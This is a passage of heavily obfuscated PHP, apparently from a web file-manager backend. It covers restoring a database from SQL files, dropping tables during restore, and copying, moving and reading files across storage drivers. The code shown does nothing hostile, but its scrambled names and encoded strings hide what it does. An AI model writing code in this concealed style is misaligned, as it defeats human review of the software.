strlen("\173\151\x6f\x3a{$¥õ´‡«Ì[$_SERVER[Ù×¯Ø…][823]]}\175")); $¥õ´‡«Ì[$_SERVER[Ù×¯Ø…][823]] = $ÛÈ‚áº¹; } $×äÆ¶Ã [] = $_SERVER[Ù×¯Ø…][1067] . $this->sqlEncode($¥õ´‡«Ì) . $_SERVER[Ù×¯Ø…][1068]; } $ß’è«œû = "\x49\116\123\x45\122\x54\40\111\116\124\117\x20\140{$ß‚ïœ Æ}\140\x20\50\x60" . implode($_SERVER[Ù×¯Ø…][1069], $ÜêçÒşÍ) . $_SERVER[Ù×¯Ø…][1070]; fwrite($é¬‡‰åì, $ß’è«œû . implode($_SERVER[Ù×¯Ø…][1071], $×äÆ¶Ã ) . $_SERVER[Ù×¯Ø…][68] . PHP_EOL); $¥©§†¹ += $Î”ÑÜè¢; if ($’Í‚ÛĞ½) { $’Í‚ÛĞ½->update($Î”ÑÜè¢); } } while ($»ÁÍ¤Ì› == $Î”ÑÜè¢); fclose($é¬‡‰åì); return $¥©§†¹; } public function sqlToDb($å³òİ¼¢, &$É¢íÉ©Ô) { $˜‚ª¥ò¢ =& $_SERVER[Ù×¯Ø…]; $´ï‹˜¼™ = $this->model()->db(); $”È®’‘Ü = @fopen($å³òİ¼¢, $˜‚ª¥ò¢[1072]); if (!$”È®’‘Ü) { return !1; } $µó‰ÎçÓ = 0; $ãÏ…Š¸© = $˜‚ª¥ò¢[33]; $…åï±ºè = array(); $Üø˜òìô = $this->type == $˜‚ª¥ò¢[9] ? 500 : 2000; $É÷Š”¾– = basename($å³òİ¼¢, $˜‚ª¥ò¢[785]); $· µ¼òº = 0; $˜ÈÚ¥„© = 4194304 - 104858; $¥ø ö¹ = 1000000 - 104858; while (!feof($”È®’‘Ü)) { $ÉğÔüí¤ = trim(fgets($”È®’‘Ü)); if (!$ÉğÔüí¤) { continue; } $¦’àÜí’ = $this->sqlDecode($ÉğÔüí¤, $this->type); if (stripos($¦’àÜí’, $˜‚ª¥ò¢[353]) === 0) { if (!$ãÏ…Š¸©) { $ãÏ…Š¸© = $¦’àÜí’ . $˜‚ª¥ò¢[50]; } continue; } if ($É¢íÉ©Ô) { $É¢íÉ©Ô->task[$˜‚ª¥ò¢[1059]] += 1; } $µó‰ÎçÓ++; $…åï±ºè[] = rtrim(rtrim(trim($¦’àÜí’), $˜‚ª¥ò¢[47]), $˜‚ª¥ò¢[68]); $¶ªÂ«ßÀ = null; $íÜù‘‰¸ = strlen($¦’àÜí’); $· µ¼òº += $íÜù‘‰¸; if ($· µ¼òº >= ($Üø˜òìô == 500 ? $˜ÈÚ¥„© : $¥ø ö¹)) { $¶ªÂ«ßÀ = array_pop($…åï±ºè); if ($µó‰ÎçÓ > 1) { $µó‰ÎçÓ--; } } if ($µó‰ÎçÓ >= $Üø˜òìô || $¶ªÂ«ßÀ) { $¦’àÜí’ = $ãÏ…Š¸© . implode($˜‚ª¥ò¢[47], $…åï±ºè); if (!$´ï‹˜¼™->execute($¦’àÜí’)) { return !1; } if ($É¢íÉ©Ô) { $É¢íÉ©Ô->update($µó‰ÎçÓ); } $…åï±ºè = array(); $µó‰ÎçÓ = 0; $· µ¼òº = 0; if ($¶ªÂ«ßÀ) { $…åï±ºè = array($¶ªÂ«ßÀ); $µó‰ÎçÓ = 1; $· µ¼òº = $íÜù‘‰¸; } } } fclose($”È®’‘Ü); if (!empty($…åï±ºè)) { $¦’àÜí’ = $ãÏ…Š¸© . implode($˜‚ª¥ò¢[47], $…åï±ºè); if (!$´ï‹˜¼™->execute($¦’àÜí’)) { return !1; } if ($É¢íÉ©Ô) { $É¢íÉ©Ô->update($µó‰ÎçÓ); } } return !0; } public function dropTable($øö¯ÒÄæ = null) { $Õ ‹éÁ¡ = $this->model()->db(); $ã¹¶«È± = $øö¯ÒÄæ ? array($øö¯ÒÄæ) : $Õ ‹éÁ¡->getTables(); if (!$ã¹¶«È±) { return; } foreach ($ã¹¶«È± as $øö¯ÒÄæ) { if ($øö¯ÒÄæ) { $øö¯ÒÄæ = strtolower($øö¯ÒÄæ); } else { continue; } $Õ ‹éÁ¡->execute("\144\162\157\160\40\x74\141\142\x6c\145\x20\x69\x66\40\145\170\151\163\x74\163\x20\x60{$øö¯ÒÄæ}\x60"); } } private function sqlEncode($öæù£¯) { $š¥ÑÙüŠ =& $_SERVER[Ù×¯Ø…]; $åš“ªÆ = array(); foreach ($öæù£¯ as $Üºšß—¢) { if (is_array($Üºšß—¢)) { $Üºšß—¢ = json_encode_force($Üºšß—¢); } $Üºšß—¢ = addslashes($Üºšß—¢); $Üºšß—¢ = str_replace(array($š¥ÑÙüŠ[1073], $š¥ÑÙüŠ[229]), array($š¥ÑÙüŠ[1074], $š¥ÑÙüŠ[1075]), $Üºšß—¢); $åš“ªÆ[] = str_replace($š¥ÑÙüŠ[55], $š¥ÑÙüŠ[1076], $Üºšß—¢); } return $š¥ÑÙüŠ[55] . implode($š¥ÑÙüŠ[1077], $åš“ªÆ) . $š¥ÑÙüŠ[55]; } private function sqlDecode($™ªÊˆÀ, $š’ˆ§â™) { $Ã¼ÏŞŞª =& $_SERVER[Ù×¯Ø…]; $™ªÊˆÀ = str_replace(array($Ã¼ÏŞŞª[1074], $Ã¼ÏŞŞª[1075]), array($Ã¼ÏŞŞª[1073], $Ã¼ÏŞŞª[229]), $™ªÊˆÀ); if ($š’ˆ§â™ == $Ã¼ÏŞŞª[9]) { $™ªÊˆÀ = stripslashes($™ªÊˆÀ); } return $™ªÊˆÀ; } } class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($é›„Ù²™, $†©ú«Ô) { $‡œı²Ï =& $_SERVER[Ù×¯Ø…]; $—§İüş… = $†©ú«Ô; $GLOBALS[$‡œı²Ï[1078]] = $‡œı²Ï[1079] . $é›„Ù²™; Hook::trigger($‡œı²Ï[1079] . $é›„Ù²™ . $‡œı²Ï[1080], $—§İüş…); $Œ÷Ãúª¶ = self::driverMake($†©ú«Ô[0]); if (!$Œ÷Ãúª¶) { return !1; } if (method_exists($Œ÷Ãúª¶, $é›„Ù²™)) { $ğ‚Õß‘¾ = @call_user_func_array(array($Œ÷Ãúª¶, $é›„Ù²™), $†©ú«Ô); } else { if (method_exists($Œ÷Ãúª¶, $‡œı²Ï[1081])) { $ğ‚Õß‘¾ = @call_user_func_array(array($Œ÷Ãúª¶, $é›„Ù²™), $†©ú«Ô); } else { if (method_exists(self, $é›„Ù²™)) { $ğ‚Õß‘¾ = @call_user_func_array(array(self, $é›„Ù²™), $†©ú«Ô); } else { $ğ‚Õß‘¾ = call_user_func_array(array(parent, $é›„Ù²™), $†©ú«Ô); } } } Hook::trigger($‡œı²Ï[1079] . $é›„Ù²™ . $‡œı²Ï[1082], $—§İüş…, $ğ‚Õß‘¾); return $ğ‚Õß‘¾; } public static function init($Ò…ã’Ôù) { return self::driverMake($Ò…ã’Ôù); } public static function copy($§š¨ù¼ª, $„û ÉƒÈ, $…úÂš› = false, $•© ©åÙ = false) { return self::copyMoveStart($§š¨ù¼ª, $„û ÉƒÈ, $…úÂš›, $_SERVER[Ù×¯Ø…][552], $•© ©åÙ); } public static function move($‹ó´œææ, $Á˜ı›Õ­, $Ÿ¬šõ½ = false, $Œ·°‚õª = false) { return self::copyMoveStart($‹ó´œææ, $Á˜ı›Õ­, $Ÿ¬šõ½, $_SERVER[Ù×¯Ø…][554], $Œ·°‚õª); } private static function copyMoveStart($‘òÙªğ, $İïä ç‘, $™÷Û­, $‡ı®¤÷, $ÖÏ¿õı«) { $Ãá’ÃÙ =& $_SERVER[Ù×¯Ø…]; $ğÒË‹ôã = array($‘òÙªğ, $İïä ç‘, $™÷Û­, $ÖÏ¿õı«); Hook::trigger($Ãá’ÃÙ[1079] . $‡ı®¤÷ . $Ãá’ÃÙ[1080], $ğÒË‹ôã); $û–­Ş±Ÿ = self::copyMove($‘òÙªğ, $İïä ç‘, $™÷Û­, $‡ı®¤÷, $ÖÏ¿õı«); Hook::trigger($Ãá’ÃÙ[1079] . $‡ı®¤÷ . $Ãá’ÃÙ[1082], $ğÒË‹ôã, $û–­Ş±Ÿ); return $û–­Ş±Ÿ; } public static function saveFile($ß¦„¿¥, $½ÄÚ¯ı, $Ñ‰ô˜Â’ = true) { $”¬Ô„òş =& $_SERVER[Ù×¯Ø…]; $©»í¬øÃ = self::info($½ÄÚ¯ı); $¼‹–üìß = self::driverMake($ß¦„¿¥); $’‚Äù‹‹ = self::driverMake($½ÄÚ¯ı); $Óó§Š¶À = !1; if ($’‚Äù‹‹->pathParse[$”¬Ô„òş[1083]]) { $Óó§Š¶À = $’‚Äù‹‹; $Ä„Îòİ¬ = $’‚Äù‹‹->pathParse[$”¬Ô„òş[1083]]; $’‚Äù‹‹ = self::driverMake($Ä„Îòİ¬); } if ($¼‹–üìß->pathParse[$”¬Ô„òş[1083]]) { $À¦¿âÒô = $¼‹–üìß->pathParse[$”¬Ô„òş[1083]]; $¼‹–üìß = self::driverMake($À¦¿âÒô); } $İ›ßü· = $’‚Äù‹‹->pathFather($½ÄÚ¯ı); $÷ıÀ¢€Ñ = !0; if (!$Ñ‰ô˜Â’ && self::driverIsSame($¼‹–üìß, $’‚Äù‹‹)) { $÷ıÀ¢€Ñ = !1; } $é—¾¥Ç… = self::copyFile($¼‹–üìß, $ß¦„¿¥, $’‚Äù‹‹, $İ›ßü·, $©»í¬øÃ[$”¬Ô„òş[28]], $÷ıÀ¢€Ñ); if ($Óó§Š¶À) { $é—¾¥Ç… = $Óó§Š¶À->getPathOuter($é—¾¥Ç…); } return $é—¾¥Ç…; } private static function copyMove($ˆ“â˜Ê, $Şí»ÂÏ¯, $æ‡˜¨ë, $Çİ†ÒÔø, $¨ÊÙ¹õ… = false) { $ÕµÊ¹¯£ =& $_SERVER[Ù×¯Ø…]; if (!$ˆ“â˜Ê || $ˆ“â˜Ê == $ÕµÊ¹¯£[8] || !$Şí»ÂÏ¯) { return !1; } ignore_timeout(); $÷´ôÁòë = self::driverMake($ˆ“â˜Ê); $ÌŠÍÈô£ = self::driverMake($Şí»ÂÏ¯); $¤Ä—¸İ½ = $Çİ†ÒÔø == $ÕµÊ¹¯£[554]; $ãµÃÊ§ = !1; if ($ÌŠÍÈô£->pathParse[$ÕµÊ¹¯£[1083]]) { $ãµÃÊ§ = $ÌŠÍÈô£; $Şí»ÂÏ¯ = $ÌŠÍÈô£->pathParse[$ÕµÊ¹¯£[1083]]; $ÌŠÍÈô£ = self::driverMake($Şí»ÂÏ¯); } if ($÷´ôÁòë->pathParse[$ÕµÊ¹¯£[1083]]) { $ˆ“â˜Ê = $÷´ôÁòë->pathParse[$ÕµÊ¹¯£[1083]]; $÷´ôÁòë = self::driverMake($ˆ“â˜Ê); } self::check($÷´ôÁòë, $ˆ“â˜Ê, $ÌŠÍÈô£, $Şí»ÂÏ¯); Hook::trigger($ÕµÊ¹¯£[73], $÷´ôÁòë, $ˆ“â˜Ê, $ÌŠÍÈô£, $Şí»ÂÏ¯); $’†¼Óóô = self::driverIsSame($÷´ôÁòë, $ÌŠÍÈô£); if ($’†¼Óóô) { if ($Çİ†ÒÔø == $ÕµÊ¹¯£[554] && !method_exists($ÌŠÍÈô£, $ÕµÊ¹¯£[1084]) && trim($Şí»ÂÏ¯, $ÕµÊ¹¯£[8]) == trim($ÌŠÍÈô£->pathFather($ˆ“â˜Ê), $ÕµÊ¹¯£[8])) { if ($÷´ôÁòë->pathThis($ˆ“â˜Ê) != $¨ÊÙ¹õ… && !$÷´ôÁòë->isTypeObject()) { return $÷´ôÁòë->rename($ˆ“â˜Ê, $¨ÊÙ¹õ…); } return $ÌŠÍÈô£->getPathOuter($ˆ“â˜Ê); } if (method_exists($ÌŠÍÈô£, $Çİ†ÒÔø)) { return $ÌŠÍÈô£->{$Çİ†ÒÔø}($ˆ“â˜Ê, $Şí»ÂÏ¯, $æ‡˜¨ë, $¨ÊÙ¹õ…); } } if ($’†¼Óóô && $Çİ†ÒÔø == $ÕµÊ¹¯£[554] && $ÌŠÍÈô£->getType() == $ÕµÊ¹¯£[106]) { $ËÇïßÁÓ = $ÌŠÍÈô£->movePath($ˆ“â˜Ê, $Şí»ÂÏ¯, $¨ÊÙ¹õ…); if ($ËÇïßÁÓ) { return $ËÇïßÁÓ; } } $ó“Şôğ = $÷´ôÁòë->isFile($ˆ“â˜Ê); if (!$ó“Şôğ && $ÌŠÍÈô£->getType() == $ÕµÊ¹¯£[757] && $÷´ôÁòë->getType() == $ÕµÊ¹¯£[106]) { $ËÇïßÁÓ = $ÌŠÍÈô£->copyFolderFromIO($÷´ôÁòë, $ˆ“â˜Ê, $Şí»ÂÏ¯, $æ‡˜¨ë, $¤Ä—¸İ½, $¨ÊÙ¹õ…); } else { $ËÇïßÁÓ = self::copyPath($÷´ôÁòë, $ˆ“â˜Ê, $ÌŠÍÈô£, $Şí»ÂÏ¯, $æ‡˜¨ë, $¤Ä—¸İ½, $ó“Şôğ, $¨ÊÙ¹õ…); } if ($ËÇïßÁÓ && $¤Ä—¸İ½) { $÷´ôÁòë->remove($ˆ“â˜Ê); } if ($ãµÃÊ§) { $ËÇïßÁÓ = $ãµÃÊ§->getPathOuter($ËÇïßÁÓ); } return $ËÇïßÁÓ; } private static function check($ùğõ½ĞÃ, $­şóÎïİ, $âÃºÕ”¤, &$ŠŠ±Á¸è) { $­€ÏÓÂÌ =& $_SERVER[Ù×¯Ø…]; if (self::driverIsSame($ùğõ½ĞÃ, $âÃºÕ”¤) && $ùğõ½ĞÃ->isFolder($­şóÎïİ) && $ùğõ½ĞÃ->isParentOf($­şóÎïİ, $ŠŠ±Á¸è)) { show_json(LNG($­€ÏÓÂÌ[1085]), !1); } if (!$ùğõ½ĞÃ->exist($­şóÎïİ)) { show_json(LNG($­€ÏÓÂÌ[105]), !1); } } private static function copyPath($‰ô‘¿‰˜, $­ ÂàÄ„, $Ãã¯©¶¸, $­™¦µñ, $ñƒÏ¹×İ, $áë›¨˜², $Ö„ãæ•›, $ôıõâì = false) { $ö”Î”ä =& $_SERVER[Ù×¯Ø…]; $™—¬‚åÅ = empty($ôıõâì) && $ôıõâì !== $ö”Î”ä[191] ? $‰ô‘¿‰˜->pathThis($­ ÂàÄ„) : $ôıõâì; if ($ñƒÏ¹×İ) { $àŞÍÄ‹Ø = $Ãã¯©¶¸->fileNameExist($­™¦µñ, $™—¬‚åÅ); $™—¬‚åÅ = $Ãã¯©¶¸->fileNameAuto($­™¦µñ, $™—¬‚åÅ, $ñƒÏ¹×İ, !$Ö„ãæ•›); $ñƒÏ¹×İ = $àŞÍÄ‹Ø ? $ñƒÏ¹×İ : !1; } if ($Ö„ãæ•›) { return self::copyFile($‰ô‘¿‰˜, $­ ÂàÄ„, $Ãã¯©¶¸, $­™¦µñ, $™—¬‚åÅ, $áë›¨˜²); } if ($ñƒÏ¹×İ == REPEAT_RENAME_FOLDER) { $ñƒÏ¹×İ = !1; } $ ­—­Ñ¸ = rtrim($­™¦µñ, $ö”Î”ä[8]) . $ö”Î”ä[8] . $™—¬‚åÅ; $ş÷×å¸ = $Ãã¯©¶¸->mkdir($Ãã¯©¶¸->getPath($ ­—­Ñ¸)); $­™¦µñ = $Ãã¯©¶¸->getPathInner($ş÷×å¸); $–µ¥Öñ¹ = $‰ô‘¿‰˜->listPath($­ ÂàÄ„, !0); $–µ¥Öñ¹ = is_array($–µ¥Öñ¹) ? $–µ¥Öñ¹ : array($ö”Î”ä[74] => array(), $ö”Î”ä[75] => array()); $ŸÌ«æíì = array_merge($–µ¥Öñ¹[$ö”Î”ä[74]], $–µ¥Öñ¹[$ö”Î”ä[75]]); foreach ($ŸÌ«æíì as $ÇŠ‚ŞÁÎ) { $Ñ§˜™Â = $ÇŠ‚ŞÁÎ[$ö”Î”ä[29]] == $ö”Î”ä[193]; $­ ÂàÄ„ = $‰ô‘¿‰˜->getPathInner($ÇŠ‚ŞÁÎ[$ö”Î”ä[76]]); $¦ƒÚííî = self::copyPath($‰ô‘¿‰˜, $­ ÂàÄ„, $Ãã¯©¶¸, $­™¦µñ, $ñƒÏ¹×İ, $áë›¨˜², $Ñ§˜™Â); if (!$¦ƒÚííî) { IO::errorTips($ö”Î”ä[1086] . $­ ÂàÄ„ . $ö”Î”ä[67] . $­™¦µñ); } } self::copyMoveKeepInfo($‰ô‘¿‰˜, $­ ÂàÄ„, $ş÷×å¸); return $ş÷×å¸; } private static function copyFile($‚ç£®¨—, $‚«Ş’üÙ, $«Ÿ€“·, $é±àö¼, $ÄàÈœÜ€, $Êªı›) { $ÏŸ€¨û¾ =& $_SERVER[Ù×¯Ø…]; $é±àö¼ = $«Ÿ€“·->getPath(rtrim($é±àö¼, $ÏŸ€¨û¾[8]) . $ÏŸ€¨û¾[8] . $ÄàÈœÜ€); $•Óç£ˆÊ = $ÏŸ€¨û¾[1087] . time() . rand_string(5); Hook::trigger($ÏŸ€¨û¾[1088], $‚ç£®¨—, $‚«Ş’üÙ, $«Ÿ€“·, $é±àö¼, $ÄàÈœÜ€, $•Óç£ˆÊ); if (self::driverIsSame($‚ç£®¨—, $«Ÿ€“·)) { if ($Êªı›) { $Ğ¡‘ø‰„ = $«Ÿ€“·->moveFile($‚«Ş’üÙ, $é±àö¼); } else { $Ğ¡‘ø‰„ = $«Ÿ€“·->copyFile($‚«Ş’üÙ, $é±àö¼); } Hook::trigger($ÏŸ€¨û¾[1089], $‚ç£®¨—, $‚«Ş’üÙ, $«Ÿ€“·, $é±àö¼, $ÄàÈœÜ€, $Ğ¡‘ø‰„); self::copyMoveKeepInfo($‚ç£®¨—, $‚«Ş’üÙ, $Ğ¡‘ø‰„); return $Ğ¡‘ø‰„; } $òÛÔœ“ = TEMP_FILES; if ($GLOBALS[$ÏŸ€¨û¾[6]][$ÏŸ€¨û¾[88]][$ÏŸ€¨û¾[801]]) { $òÛÔœ“ = $GLOBALS[$ÏŸ€¨û¾[6]][$ÏŸ€¨û¾[88]][$ÏŸ€¨û¾[801]]; } $©íŸìŒ® = $òÛÔœ“; mk_dir($©íŸìŒ®); $˜„Å‘†ü = $©íŸìŒ® . $•Óç£ˆÊ; $†Ìá¿ë“ = $˜„Å‘†ü; $˜„Å‘†ü = $‚ç£®¨—->download($‚«Ş’üÙ, $˜„Å‘†ü); $˜„Å‘†ü = $‚ç£®¨—->iconvApp($˜„Å‘†ü); if (substr($˜„Å‘†ü, strlen($òÛÔœ“)) == $òÛÔœ“) { $Êªı› = !0; } $Ğ¡‘ø‰„ = $«Ÿ€“·->upload($é±àö¼, $˜„Å‘†ü, $Êªı›); self::remove($†Ìá¿ë“); Hook::trigger($ÏŸ€¨û¾[1089], $‚ç£®¨—, $‚«Ş’üÙ, $«Ÿ€“·, $é±àö¼, $ÄàÈœÜ€, $Ğ¡‘ø‰„); self::copyMoveKeepInfo($‚ç£®¨—, $‚«Ş’üÙ, $Ğ¡‘ø‰„); return $Ğ¡‘ø‰„; } private static function copyMoveKeepInfo($ƒŸ¼øÉ‚, $ôÄâ±¯Û, $ğæ±ªÈ˜) { if (!$ğæ±ªÈ˜) { return; } $ïê®‹ÅÍ = $ƒŸ¼øÉ‚->info($ôÄâ±¯Û); if (!is_array($ïê®‹ÅÍ)) { return; } IO::setModifyTime($ğæ±ªÈ˜, $ïê®‹ÅÍ[$_SERVER[Ù×¯Ø…][84]]); } public static function pathFather($à„Æ´»½) { $Ú¿ŸŞôª = IO::init($à„Æ´»½); $–‚ø²â• = $Ú¿ŸŞôª->pathFather($Ú¿ŸŞôª->path); return $Ú¿ŸŞôª->getPathOuter($–‚ø²â•); } public static function fileOut($‰‹„ùŞ, $İéœ™éó = false, $üş×ÖÇµ = false, $«˜™Îõ = '') { $ø¡¢Ñ°Š = self::driverMake($‰‹„ùŞ); if ($ø¡¢Ñ°Š->isFileOutServer()) { return $ø¡¢Ñ°Š->fileOutServer($‰‹„ùŞ, $İéœ™éó, $üş×ÖÇµ, $«˜™Îõ); } return $ø¡¢Ñ°Š->fileOut($‰‹„ùŞ, $İéœ™éó, $üş×ÖÇµ, $«˜™Îõ); } public static function fileOutImage($†üöüâş, $£‰ß£ = 250) { $Ğ«…¢· = array(250, 600, 1200, 2000, 3000, 5000); for ($Í´‰£æà = 0; $Í´‰£æà < count($Ğ«…¢·); $Í´‰£æà++) { if ($Í´‰£æà == 0 && $£‰ß£ <= $Ğ«…¢·[$Í´‰£æà]) { $£‰ß£ = $Ğ«…¢·[$Í´‰£æà]; break; } else { if ($£‰ß£ > $Ğ«…¢·[$Í´‰£æà - 1] && $£‰ß£ <= $Ğ«…¢·[$Í´‰£æà]) { $£‰ß£ = $Ğ«…¢·[$Í´‰£æà]; break; } else { if ($Í´‰£æà == count($Ğ«…¢·) - 1 && $£‰ß£ > $Ğ«…¢·[$Í´‰£æà]) { $£‰ß£ = $Ğ«…¢·[$Í´‰£æà]; break; } } } } $ÇÀ¥¸ÂÌ = self::driverMake($†üöüâş); if ($ÇÀ¥¸ÂÌ->isFileOutServer()) { return $ÇÀ¥¸ÂÌ->fileOutImageServer($†üöüâş, $£‰ß£); } return $ÇÀ¥¸ÂÌ->fileOutImage($†üöüâş, $£‰ß£); } private static function driverIsSame($ªŞË‹Œò, $‰¦ó¼¬œ) { $Ë—§¿˜ =& $_SERVER[Ù×¯Ø…]; $¥éŠ÷™¾ = $ªŞË‹Œò->getType(); $µ¹ôØ‘“ = $‰¦ó¼¬œ->getType(); if ($¥éŠ÷™¾ != $µ¹ôØ‘“) { return !1; } if ($¥éŠ÷™¾ == $Ë—§¿˜[757]) { return !0; } if ($¥éŠ÷™¾ == $Ë—§¿˜[106]) { return !0; } if ($ªŞË‹Œò->pathDriver == $‰¦ó¼¬œ->pathDriver) { return !0; } return !1; } public static function copyUpdate($Ã¶êŞùü, $ïôûçç) { $áöãàô  =& $_SERVER[Ù×¯Ø…]; if (!IO::exist($Ã¶êŞùü)) { return !1; } if (!IO::exist($ïôûçç)) { IO::mkdir($ïôûçç); } $¨öš«„“ = self::_listAll($Ã¶êŞùü); $§»•ù‡× = self::_listAll($ïôûçç); $½ˆœ»İ = array(); $ú¡ÚÛÎ£ = array(); foreach ($¨öš«„“ as $˜‹şùæÏ => $ªßÄª÷) { if (isset($§»•ù‡×[$˜‹şùæÏ])) { if ($ªßÄª÷[$áöãàô [77]] == 1) { continue; } if ($§»•ù‡×[$˜‹şùæÏ][$áöãàô [78]] == $ªßÄª÷[$áöãàô [78]]) { continue; } } if ($ªßÄª÷[$áöãàô [77]] == 1) { $ú¡ÚÛÎ£[] = $ïôûçç . $áöãàô [8] . $˜‹şùæÏ; continue; } $’ğ“Ù¸© = strstr(trim($˜‹şùæÏ, $áöãàô [8]), $áöãàô [8]) ? get_path_father($˜‹şùæÏ) : $áöãàô [33]; $½ˆœ»İ[] = array($áöãàô [1090] => $ªßÄª÷[$áöãàô [76]], $áöãàô [1091] => rtrim($ïôûçç, $áöãàô [8]) . $áöãàô [8] . $’ğ“Ù¸©, $áöãàô [1092] => $ªßÄª÷); } $Ãò÷È…— = array($áöãàô [193] => $½ˆœ»İ, $áöãàô [77] => $ú¡ÚÛÎ£); Hook::trigger($áöãàô [1093], $Ã¶êŞùü, $ïôûçç, $Ãò÷È…—); foreach ($ú¡ÚÛÎ£ as $ªßÄª÷) { IO::mkdir($ªßÄª÷); } foreach ($½ˆœ»İ as $ªßÄª÷) { IO::copy($ªßÄª÷[$áöãàô [1090]], $ªßÄª÷[$áöãàô [1091]], REPEAT_REPLACE); } } private static function _listAll($•‡€»”) { $³ú’ôñÀ =& $_SERVER[Ù×¯Ø…]; $•‡€»” = KodIO::clear($•‡€»”); $õÔæºÁœ = IO::listAll($•‡€»”); foreach ($õÔæºÁœ as &$µŸ ü¼˜) { $Ù·…ò–ˆ = substr($µŸ ü¼˜[$³ú’ôñÀ[76]], strlen($•‡€»”)); $µŸ ü¼˜[$³ú’ôñÀ[1094]] = trim($Ù·…ò–ˆ, $³ú’ôñÀ[8]); } unset($µŸ ü¼˜); return array_to_keyvalue($õÔæºÁœ, $³ú’ôñÀ[1094]); } public static function fileSubstr($âôßç³è, $ß€š¡À®, $åâÚèæ¸ = false) { $Òù·¿· =& $_SERVER[Ù×¯Ø…]; $¬éÇ‡‡Ÿ = self::driverMake($âôßç³è); $º˜â˜’” = $¬éÇ‡‡Ÿ->size($âôßç³è); $ÇÖ¬¨î = $ß€š¡À®; $ì–Ò÷§ = $åâÚèæ¸; if ($ß€š¡À® < 0) { $ß€š¡À® = $º˜â˜’” + $ß€š¡À®; } if ($åâÚèæ¸ === !1) { $åâÚèæ¸ = $º˜â˜’” - $ß€š¡À®; } if ($ß€š¡À® + $åâÚèæ¸ > $º˜â˜’”) { $åâÚèæ¸ = $º˜â˜’” - $ß€š¡À®; } if (!$º˜â˜’” && $¬éÇ‡‡Ÿ->getType() == $Òù·¿·[106] && !$¬éÇ‡‡Ÿ->exist($âôßç³è)) { throw new Exception($Òù·¿·[1095] . LNG($Òù·¿·[1096]) . $Òù·¿·[963] . get_path_this($âôßç³è) . $Òù·¿·[33]); } if ($åâÚèæ¸ <= 0) { return $Òù·¿·[33]; } if ($ß€š¡À® < 0 || $ß€š¡À® >= $º˜â˜’” || $åâÚèæ¸ > 1024 * 1024 * 10) { throw new Exception("\x66\x69\x6c\x65\x52\x65\x61\144\x20\x65\162\162\x6f\x72\x21\40\163\164\x61\x72\x74\75{$ß€š¡À®}\73\154\x65\156\147\164\x68\x3d{$åâÚèæ¸}\x3b\40\163\x69\x7a\145\75{$º˜â˜’”}\x3b"); } $Õœ˜Ó—› = $¬éÇ‡‡Ÿ->fileSubstr($âôßç³è, $ß€š¡À®, $åâÚèæ¸); if (!$Õœ˜Ó—› && $åâÚèæ¸ && isset($GLOBALS[$Òù·¿·[1097]])) { throw new Exception($GLOBALS[$Òù·¿·[1097]][$Òù·¿·[1098]]); } return $Õœ˜Ó—›; } private static function driverMake(&$ÛÇ„ôÍŒ) { $º³·¢ÔÇ =& $_SERVER[Ù×¯Ø…]; $Ğ×„·³ì = KodIO::parse($ÛÇ„ôÍŒ); if (!self::$driverListSystem) { $ª„‡¬ª± = Model($º³·¢ÔÇ[766])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($ª„‡¬ª±, $º³·¢ÔÇ[395]); } if ($Ğ×„·³ì[$º³·¢ÔÇ[29]] == KodIO::KOD_IO && !self::$driverListSystem[$Ğ×„·³ì[$º³·¢ÔÇ[395]]]) { return !1; } $ÛÇ„ôÍŒ = $Ğ×„·³ì[$º³·¢ÔÇ[1099]]; $Ğ¯¨©î  = self::driverGet($Ğ×„·³ì, $ÛÇ„ôÍŒ); return $Ğ¯¨©î ; } private static function driverGet($ßŸÙŒ, &$·ºÇšû) { $‚±°Áöº =& $_SERVER[Ù×¯Ø…]; $™¿½ì¤ = $ßŸÙŒ[$‚±°Áöº[1100]]; $ë³Çæ†ó = $ßŸÙŒ[$‚±°Áöº[395]]; switch ($ßŸÙŒ[$‚±°Áöº[29]]) { case KodIO::KOD_IO: $š‰ ›§  = self::$driverListSystem[$ë³Çæ†ó]; break; case KodIO::KOD_SOURCE: $·ºÇšû = $ë³Çæ†ó . $·ºÇšû; $š‰ ›§  = array($‚±°Áöº[1101] => $‚±°Áöº[1102], $‚±°Áöº[6] => $ßŸÙŒ); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $÷ßš½ÕÆ = $GLOBALS[$‚±°Áöº[1103]]; self::$driverListUser = array_to_keyvalue($÷ßš½ÕÆ, $‚±°Áöº[395]); } $š‰ ›§  = self::$driverListUser[$ë³Çæ†ó]; break; case KodIO::KOD_SHARE_LINK: $š‰ ›§  = array($‚±°Áöº[1101] => $‚±°Áöº[1104], $‚±°Áöº[6] => $ßŸÙŒ); $¹âº¶¤‰ = Action($‚±°Áöº[1105])->sharePathInfo($ßŸÙŒ[$‚±°Áöº[76]]); $·ºÇšû = $¹âº¶¤‰[$‚±°Áöº[406]]; if (!$¹âº¶¤‰[$‚±°Áöº[406]]) { $ÀÂüí“ = Model($‚±°Áöº[598])->getInfo($¹âº¶¤‰[$‚±°Áöº[491]]); $·ºÇšû = KodIO::clear($ÀÂüí“[$‚±°Áöº[1106]] . $ßŸÙŒ[$‚±°Áöº[1099]]); $ßŸÙŒ[$‚±°Áöº[489]] = $ÀÂüí“; $ßŸÙŒ[$‚±°Áöº[1083]] = $·ºÇšû; $š‰ ›§  = array($‚±°Áöº[1101] => $‚±°Áöº[1107], $‚±°Áöº[6] => $ßŸÙŒ); } break; case KodIO::KOD_SHARE_ITEM: $š‰ ›§  = array($‚±°Áöº[1101] => $‚±°Áöº[1108], $‚±°Áöº[6] => $ßŸÙŒ); $ÀÂüí“ = Model($‚±°Áöº[598])->getInfo($ßŸÙŒ[$‚±°Áöº[395]]); if ($ÀÂüí“[$‚±°Áöº[406]] == $‚±°Áöº[191]) { $·ºÇšû = KodIO::clear($ÀÂüí“[$‚±°Áöº[1106]] . $ßŸÙŒ[$‚±°Áöº[1099]]); $ßŸÙŒ[$‚±°Áöº[489]] = $ÀÂüí“; $ßŸÙŒ[$‚±°Áöº[1083]] = $·ºÇšû; $š‰ ›§  = array($‚±°Áöº[1101] => $‚±°Áöº[1109], $‚±°Áöº[6] => $ßŸÙŒ); } else { if (!$·ºÇšû) { $·ºÇšû = $ÀÂüí“[$‚±°Áöº[406]]; } } break; default: $·ºÇšû = $ßŸÙŒ[$‚±°Áöº[76]]; $š‰ ›§  = array($‚±°Áöº[1101] => $‚±°Áöº[1110]); break; } $Ï–ó— = $ßŸÙŒ[$‚±°Áöº[76]]; if (!isset(self::$driverCache[$Ï–ó—])) { $‚‰„¬’ = 